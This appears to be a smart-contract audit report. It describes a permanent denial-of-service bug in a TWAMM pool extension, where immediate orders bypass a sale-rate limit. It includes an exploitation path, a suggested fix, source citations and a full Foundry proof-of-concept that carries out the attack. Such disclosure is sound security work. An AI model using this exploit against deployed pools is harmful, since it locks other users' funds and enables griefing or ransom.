## Title
Immediate Orders Bypass MAX_ABS_VALUE_SALE_RATE_DELTA Constraint Enabling Permanent Pool DOS

## Summary
The TWAMM extension enforces a per-time constraint (`MAX_ABS_VALUE_SALE_RATE_DELTA`) on sale rate deltas to prevent overflow, but immediate orders (startTime ≤ block.timestamp) bypass this check when updating the current pool state. An attacker can create multiple immediate orders with different end times, causing the current sale rate to reach `type(uint112).max` (91x the intended per-time limit), which permanently DOS's the pool when any future time boundary needs to be crossed.

## Impact
**Severity**: High

## Finding Description

**Location:** `src/extensions/TWAMM.sol` - `handleForwardData` function, lines 274-299

**Intended Logic:** The `MAX_ABS_VALUE_SALE_RATE_DELTA` constraint (defined as `type(uint112).max / 91`) should prevent sale rate overflow by ensuring that at any time, the cumulative sale rate from all active orders cannot exceed `type(uint112).max`. The constraint is enforced via `_addConstrainSaleRateDelta` which validates that `abs(result) <= MAX_ABS_VALUE_SALE_RATE_DELTA`. [1](#0-0) 

**Actual Logic:** When orders start immediately (block.timestamp ≥ startTime), the current sale rate is updated using `addSaleRateDelta` instead of `_addConstrainSaleRateDelta`. The `addSaleRateDelta` function only checks if the result exceeds `type(uint112).max`, NOT `MAX_ABS_VALUE_SALE_RATE_DELTA`. [2](#0-1) [3](#0-2) 

In contrast, future orders properly enforce the constraint: [4](#0-3) [5](#0-4) 

**Exploitation Path:**

1. **Attacker creates 91 immediate orders**: Each order has startTime ≤ block.timestamp, a unique end time (using all 91 valid future times), and sale rate = `MAX_ABS_VALUE_SALE_RATE_DELTA`
   - For each order, the current sale rate is incremented via `addSaleRateDelta` (lines 285, 290)
   - Each end time delta is constrained individually via `_updateTime` (line 298)
   - After 91 orders: current sale rate = `91 * MAX_ABS_VALUE_SALE_RATE_DELTA = type(uint112).max`

2. **Any user creates a future order**: When a legitimate user creates an order with startTime > block.timestamp, the start time receives a positive delta through `_updateTime`

3. **Virtual order execution triggers overflow**: When `lockAndExecuteVirtualOrders` executes and crosses that future start time boundary:
   - Line 556-557 calls `addSaleRateDelta(type(uint112).max, positiveDelta)`
   - This overflows and reverts with `SaleRateDeltaOverflow` [6](#0-5) 

4. **Pool is permanently frozen**: Since `beforeSwap`, `beforeUpdatePosition`, and `beforeCollectFees` all call `lockAndExecuteVirtualOrders`, every pool operation fails [7](#0-6) 

**Security Property Broken:** Violates the critical invariant: "Withdrawal Availability: All positions MUST be withdrawable at any time." Users cannot withdraw positions, collect fees, or perform any pool operations once the attack succeeds.

## Impact Explanation

- **Affected Assets**: All liquidity positions in the TWAMM pool, all pending TWAMM orders, and all tokens locked in those positions
- **Damage Severity**: Complete and permanent freeze of the pool. Users cannot withdraw liquidity, collect fees, cancel orders, or perform swaps. Funds remain locked until the attacker cancels their orders (which may never happen)
- **User Impact**: All users with positions or orders in the affected pool are impacted. The attack affects the entire pool, not just the attacker's positions

## Likelihood Explanation

- **Attacker Profile**: Any user with sufficient capital to create 91 orders (approximately 91 * minimum_order_amount worth of tokens)
- **Preconditions**: 
  - TWAMM pool must be initialized with the TWAMM extension
  - Attacker needs capital for 91 orders at `MAX_ABS_VALUE_SALE_RATE_DELTA` sale rate each
  - There must be 91 distinct valid future times available (always true given the time grid system)
- **Execution Complexity**: Single multicall transaction to create all 91 orders simultaneously. Can be executed atomically.
- **Frequency**: Can be executed once per pool. Once executed, the DOS is permanent until attacker cancels orders. Multiple attackers can coordinate to affect multiple pools simultaneously.

## Recommendation

Enforce the `MAX_ABS_VALUE_SALE_RATE_DELTA` constraint when updating the current sale rate for immediate orders. Modify the `handleForwardData` function to use `_addConstrainSaleRateDelta` instead of `addSaleRateDelta`:

```solidity
// In src/extensions/TWAMM.sol, handleForwardData function, lines ~280-293:

// CURRENT (vulnerable):
if (isToken1) {
    currentState = createTwammPoolState({
        _lastVirtualOrderExecutionTime: lastTime,
        _saleRateToken0: rate0,
        _saleRateToken1: uint112(addSaleRateDelta(rate1, saleRateDelta))
    });
} else {
    currentState = createTwammPoolState({
        _lastVirtualOrderExecutionTime: lastTime,
        _saleRateToken0: uint112(addSaleRateDelta(rate0, saleRateDelta)),
        _saleRateToken1: rate1
    });
}

// FIXED:
// Track cumulative current sale rates to enforce constraint
int112 currentDelta0 = int112(uint112(rate0));
int112 currentDelta1 = int112(uint112(rate1));

if (isToken1) {
    // Validate cumulative current rate doesn't exceed per-time constraint
    int112 newRate1 = _addConstrainSaleRateDelta(currentDelta1, saleRateDelta);
    currentState = createTwammPoolState({
        _lastVirtualOrderExecutionTime: lastTime,
        _saleRateToken0: rate0,
        _saleRateToken1: uint112(newRate1)
    });
} else {
    int112 newRate0 = _addConstrainSaleRateDelta(currentDelta0, saleRateDelta);
    currentState = createTwammPoolState({
        _lastVirtualOrderExecutionTime: lastTime,
        _saleRateToken0: uint112(newRate0),
        _saleRateToken1: rate1
    });
}
```

**Alternative mitigation**: Track a global "current rate delta" separately from future time deltas, applying the same constraint to ensure the system's fundamental invariant (no overflow when crossing all 91 time boundaries) is maintained.

## Proof of Concept

```solidity
// File: test/Exploit_ImmediateOrderDOS.t.sol
// Run with: forge test --match-test test_ImmediateOrderDOS -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Orders.sol";
import "../test/FullTest.sol";
import {MAX_ABS_VALUE_SALE_RATE_DELTA, nextValidTime} from "../src/math/time.sol";
import {createOrderConfig} from "../src/types/orderConfig.sol";

contract Exploit_ImmediateOrderDOS is FullTest {
    TWAMM twamm;
    Orders orders;
    PoolKey poolKey;

    function setUp() public override {
        FullTest.setUp();
        
        // Deploy TWAMM extension
        address deployAddress = address(uint160(twammCallPoints().toUint8()) << 152);
        deployCodeTo("TWAMM.sol", abi.encode(core), deployAddress);
        twamm = TWAMM(deployAddress);
        
        // Deploy Orders contract
        orders = new Orders(core, twamm, address(this));
        
        // Create TWAMM pool
        poolKey = createPool(
            address(token0), 
            address(token1), 
            0, 
            createFullRangePoolConfig(100, address(twamm))
        );
        
        // Add liquidity for swaps
        updatePosition(poolKey, 0, 1000000e18, 1000000e18);
    }

    function test_ImmediateOrderDOS() public {
        // SETUP: Get all 91 valid future end times
        uint64 currentTime = uint64(block.timestamp);
        uint64[] memory endTimes = new uint64[](91);
        uint256 count = 0;
        uint64 t = currentTime;
        
        while (count < 91) {
            uint256 nextTime = nextValidTime(currentTime, t);
            if (nextTime == 0 || nextTime > type(uint64).max) break;
            t = uint64(nextTime);
            endTimes[count++] = t;
        }
        
        // EXPLOIT: Create 91 immediate orders with different end times
        // Each order has sale rate = MAX_ABS_VALUE_SALE_RATE_DELTA
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);
        deal(address(token0), attacker, type(uint256).max);
        token0.approve(address(orders), type(uint256).max);
        
        for (uint256 i = 0; i < count; i++) {
            OrderKey memory orderKey = OrderKey({
                poolKey: poolKey,
                config: createOrderConfig({
                    _startTime: currentTime,  // Immediate start
                    _endTime: endTimes[i],    // Different end time for each
                    _isToken1: false
                })
            });
            
            // Each order adds MAX_ABS_VALUE_SALE_RATE_DELTA to current rate
            orders.mintAndIncreaseSellAmount(
                orderKey,
                uint112(MAX_ABS_VALUE_SALE_RATE_DELTA * (endTimes[i] - currentTime) >> 32),
                uint112(MAX_ABS_VALUE_SALE_RATE_DELTA)
            );
        }
        vm.stopPrank();
        
        // VERIFY: Current sale rate is now type(uint112).max
        (,uint112 rate0,) = twamm.poolState(poolKey.toPoolId()).parse();
        assertEq(rate0, type(uint112).max, "Current rate maxed out");
        
        // VERIFY: Any operation requiring virtual order execution will fail
        // if there's any future order with positive delta
        
        // Try to create a future order as honest user
        address honestUser = address(0xABCD);
        vm.startPrank(honestUser);
        deal(address(token0), honestUser, 1000e18);
        token0.approve(address(orders), type(uint256).max);
        
        uint64 futureStart = endTimes[0] + 256;
        OrderKey memory futureOrder = OrderKey({
            poolKey: poolKey,
            config: createOrderConfig({
                _startTime: futureStart,
                _endTime: futureStart + 512,
                _isToken1: false
            })
        });
        
        orders.mintAndIncreaseSellAmount(futureOrder, 1000e18, type(uint112).max);
        vm.stopPrank();
        
        // Fast forward to when future order should start
        vm.warp(futureStart);
        
        // Try to execute virtual orders - THIS WILL REVERT
        vm.expectRevert(SaleRateDeltaOverflow.selector);
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // This means ALL pool operations are now DOS'd:
        vm.expectRevert(); // beforeSwap calls lockAndExecuteVirtualOrders
        swap(poolKey, true, 1e18, false);
    }
}
```

**Notes**

1. **Asymmetric Constraint Enforcement**: The vulnerability stems from different constraint checks for immediate vs future orders. Future orders properly enforce `MAX_ABS_VALUE_SALE_RATE_DELTA` on both start and end time deltas, but immediate orders only enforce it on the end time delta while allowing the current rate to grow unconstrained up to `type(uint112).max`.

2. **Attack Economics**: The attacker needs capital to create 91 orders but can freeze far more value locked by other users. This makes the attack economically viable as a griefing mechanism or as leverage for ransom (attacker could demand payment to cancel orders and unfreeze the pool).

3. **Permanent Nature**: The DOS persists until the attacker cancels enough orders to bring the current rate below `type(uint112).max - MAX_ABS_VALUE_SALE_RATE_DELTA`. Since order cancellation requires the attacker's cooperation, this is effectively permanent.

4. **Root Cause**: The design incorrectly assumes that the constraint on individual time deltas is sufficient, but fails to account for the accumulation of immediate orders' contributions to the current state, which doesn't go through any time boundary and thus bypasses the per-time constraint.

### Citations

**File:** src/math/time.sol (L6-10)
```text
// For any given time `t`, there are up to 91 times that are greater than `t` and valid according to `isTimeValid`
uint256 constant MAX_NUM_VALID_TIMES = 91;

// If we constrain the sale rate delta to this value, then the current sale rate will never overflow
uint256 constant MAX_ABS_VALUE_SALE_RATE_DELTA = type(uint112).max / MAX_NUM_VALID_TIMES;
```

**File:** src/extensions/TWAMM.sol (L118-132)
```text
    function _addConstrainSaleRateDelta(int112 saleRateDelta, int256 saleRateDeltaChange)
        internal
        pure
        returns (int112 saleRateDeltaNext)
    {
        int256 result = int256(saleRateDelta) + saleRateDeltaChange;

        // checked addition, no overflow of int112 type
        if (FixedPointMathLib.abs(result) > MAX_ABS_VALUE_SALE_RATE_DELTA) {
            revert MaxSaleRateDeltaPerTime();
        }

        // we know cast is safe because abs(result) is less than MAX_ABS_VALUE_SALE_RATE_DELTA which fits in a int112
        saleRateDeltaNext = int112(result);
    }
```

**File:** src/extensions/TWAMM.sol (L271-273)
```text
                if (block.timestamp < startTime) {
                    _updateTime(poolId, startTime, saleRateDelta, isToken1, numOrdersChange);
                    _updateTime(poolId, endTime, -int256(saleRateDelta), isToken1, numOrdersChange);
```

**File:** src/extensions/TWAMM.sol (L274-299)
```text
                } else {
                    // we know block.timestamp < orderKey.endTime because we validate that first
                    // and we know the order is active, so we have to apply its delta to the current pool state
                    StorageSlot currentStateSlot = TWAMMStorageLayout.twammPoolStateSlot(poolId);
                    TwammPoolState currentState = TwammPoolState.wrap(currentStateSlot.load());
                    (uint32 lastTime, uint112 rate0, uint112 rate1) = currentState.parse();

                    if (isToken1) {
                        currentState = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: lastTime,
                            _saleRateToken0: rate0,
                            _saleRateToken1: uint112(addSaleRateDelta(rate1, saleRateDelta))
                        });
                    } else {
                        currentState = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: lastTime,
                            _saleRateToken0: uint112(addSaleRateDelta(rate0, saleRateDelta)),
                            _saleRateToken1: rate1
                        });
                    }

                    currentStateSlot.store(TwammPoolState.unwrap(currentState));

                    // only update the end time
                    _updateTime(poolId, endTime, -int256(saleRateDelta), isToken1, numOrdersChange);
                }
```

**File:** src/extensions/TWAMM.sol (L554-558)
```text
                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: uint112(addSaleRateDelta(state.saleRateToken0(), saleRateDeltaToken0)),
                            _saleRateToken1: uint112(addSaleRateDelta(state.saleRateToken1(), saleRateDeltaToken1))
                        });
```

**File:** src/extensions/TWAMM.sol (L647-664)
```text
    function beforeSwap(Locker, PoolKey memory poolKey, SwapParameters) external override(BaseExtension, IExtension) {
        lockAndExecuteVirtualOrders(poolKey);
    }

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeUpdatePosition(Locker, PoolKey memory poolKey, PositionId, int128)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeCollectFees(Locker, PoolKey memory poolKey, PositionId)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
```

**File:** src/math/twamm.sol (L26-38)
```text
/// @dev Adds the sale rate delta to the saleRate and reverts if the result is greater than type(uint112).max
/// @dev Assumes saleRate <= type(uint112).max and saleRateDelta <= type(int112).max and saleRateDelta >= type(int112).min
function addSaleRateDelta(uint256 saleRate, int256 saleRateDelta) pure returns (uint256 result) {
    assembly ("memory-safe") {
        result := add(saleRate, saleRateDelta)
        // if any of the upper bits are non-zero, revert
        if shr(112, result) {
            // cast sig "SaleRateDeltaOverflow()"
            mstore(0, shl(224, 0xc902643d))
            revert(0, 4)
        }
    }
}
```
